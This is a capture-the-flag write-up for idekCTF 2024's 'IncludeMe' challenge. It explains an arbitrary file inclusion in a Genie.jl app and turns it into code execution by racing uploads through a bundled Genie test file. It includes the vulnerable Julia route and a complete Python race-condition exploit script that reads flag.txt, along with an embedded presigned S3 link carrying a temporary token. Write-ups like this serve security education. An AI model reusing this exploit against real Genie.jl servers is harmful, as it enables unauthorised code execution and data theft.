---
id: 476adce3-c249-4a2d-ad88-ea823a5c99a1
title: Arbitrary File Inclusion Leading to RCE in Genie.jl - IncludeMe [idekCTF 2024]
created_time: 2024-08-19T00:24:00.000Z
last_edited_time: 2024-09-28T00:27:00.000Z
cover_image: ./imgs/images_CYPDSAFZ
icon_emoji: 🏎️
categories: []
verification:
  state: unverified
  verified_by: null
  date: null
page: Arbitrary File Inclusion Leading to RCE in Genie.jl - IncludeMe [idekCTF 2024]
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/images_CYPDSAFZ

---

In idekCTF 2024, I played with the **P1G SEKAI** team and secured 1st place out of 1,068 teams! I solved a challenge named "Included me" and got the first blood on that challenge.

# Challenge Description

another minimalist, frontend-less, challenge because i'm bad at writing server-side challenges

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/709a0b78-7ae2-4171-930b-e98c753c8621/includeme.tar.gz?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB466R3XOEI65%2F20250523%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250523T095015Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDEaCXVzLXdlc3QtMiJGMEQCIAf8bWjyIS9bN6vdZvAuwF6iYOVrVrAGhCW7tc25tfqTAiACdJ2yhw7VV3c%2FTddS%2Fnxz6dbs4tWqs3Jo3XyZRi02MyqIBAjq%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMQ9PncArTza1rXB8NKtwDn8EID3Fldhpc%2BrzF6WRx%2BL9cvoj041%2Bn%2B152srdSpe9qpqi%2Bdld7wviLao6plrPO2MkwVdCOQgZGj07aAc1HgYVE0mjVPat9jBw5vVb2n0TV6pojkx55jH7QT0mbmWMUrBBREsIvQ5wEN44Ngv6wc7oZ1a6VwqXaGFwG%2BuSZ%2BZ8qllWwQtQO4kiDE7ohwRWXOr5xDP31bjs0WqGtaG52vfOUWOZCU3iyvqFqyrRln8HU63g447qN%2FgvJKSRUtmYlANA6pCrk4W9IlYl06t8%2Bo6bVU9CSTF%2BHfJ9IuBOA8FHvVErq4c3X245VyF%2B10PFPnyZFRlLah7hGeY2N4OGRTGTo%2FuGc6S3qcC4rLrd9mb%2FHywWDBDJ5a%2F4CozYWziALrUt4R8oZ1%2F3C0MaNMVrwElqrddFIPZ2yF61BY6MNW2y505Gs45Hw5dggXQrHIS1s00m7DwGqOolmbFm9znTSi6i2EM50dfC1Vl6W88K31v3HBVEVqZ9bQDQe0EZKbYt7oO9VOYSDtKQGAtLWZ4GWuo1MOlxGy6y62AJiPHVdHlAjsGHmt8CjgdpM0yxiqmmqi%2BpAZifs3G%2BjEfwOguhG0vTHa0Y6LQ6Ul8sFqww5z7%2BaxGwg6uWu%2BJ2zdxww1%2FHAwQY6pgHoRp1QNjehUXBZQxR86SH%2FtMgFI%2BzuXdu7xbICDyu5J%2F8LPeI5Yvpm%2Bh4JFnZutLXvLtf6YDBeMrqkNCnbKF6BcPMJiWpgkWF07tZsIy5yTUydbttrwihs1Z99aNPJ78vVqFglbAmVIZSNedNsfXU5RJjK1RsSyNj1DUHPDTvex%2FBMeBzECZ49SvS%2Fc5tccZHJ%2Fq1Fs6ZCSo6KJnnNHhLff3SCQF12\&X-Amz-Signature=793fec4db5793670ccbf9546709c52c5e281a939ab2c5af04cee590342af3e2b\&X-Amz-SignedHeaders=host\&x-id=GetObject)

# How to Solve

The goal of this challenge was to achieve Remote Code Execution (RCE) and capture the flag. The program was vulnerable to arbitrary file inclusion here:

```julia
using Genie, Genie.Requests, Pkg

Pkg.activate(".")

index() = include(params(:page, "example.jl"))

route("/", index)

up(1337, "0.0.0.0", async = false)
```

We could include arbitrary files into the application, altering its flow. I discovered that we could include a test case from this Genie.jl repository:

> [![image](./imgs/b322ed80-bc5a-11e9-807a-9b53749c40ef_ftYlQyUC) **Genie.jl/test/fileuploads/test.jl at 509886d61a75d74bcbd45db1f77230abd4cd11a8 · GenieFramework/Genie.jl**](https://github.com/GenieFramework/Genie.jl/blob/509886d61a75d74bcbd45db1f77230abd4cd11a8/test/fileuploads/test.jl#L14)\
> 🧞The highly productive Julia web framework. Contribute to GenieFramework/Genie.jl development by creating an account on GitHub.\
> <https://github.com/GenieFramework/Genie.jl/blob/509886d61a75d74bcbd45db1f77230abd4cd11a8/test/fileuploads/test.jl#L14>

This test case essentially exposes a file upload vulnerability, allowing us to upload arbitrary files into Genie. However, after including that file, the program’s flow would change, preventing us from doing it a second time… or would it? The solution is yes, we can include it again if we’re fast enough to include `app.jl` right after uploading the file. This requires a race condition. Here's my solution script:

```python
import httpx
import asyncio

URL = "http://localhost:1337"
# URL = "https://includeme-295e03fffda9795f.instancer.idek.team/"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url, timeout=100)
    def page(self, page):
        return self.c.get("/", params={"page": page})
    def upload(self, fileupload):
        return self.c.post("/", files={"fileupload": ("x.jl", fileupload)})
class API(BaseAPI):
    ...

async def main():
    api = API()
    ress = []
    res1 = api.page("../home/ctf/.julia/packages/Genie/yQwwj/test/fileuploads/test.jl")
    ress.append(res1)
    for i in range(10):
        res2 = api.upload("""
read(`cat flag.txt`, String)
""")
        for j in range(10):
            res3 = api.page("app.jl")
            ress.append(res3)
        ress.extend([res1, res2])
    ress = await asyncio.gather(*ress)
    for res in ress:
        print(res.text)


if __name__ == "__main__":
    asyncio.run(main())

```

Next, visit <http://localhost:1337/?page=x.jl> to retrieve the flag.

![](./imgs/image_2FRbeU5K.png)
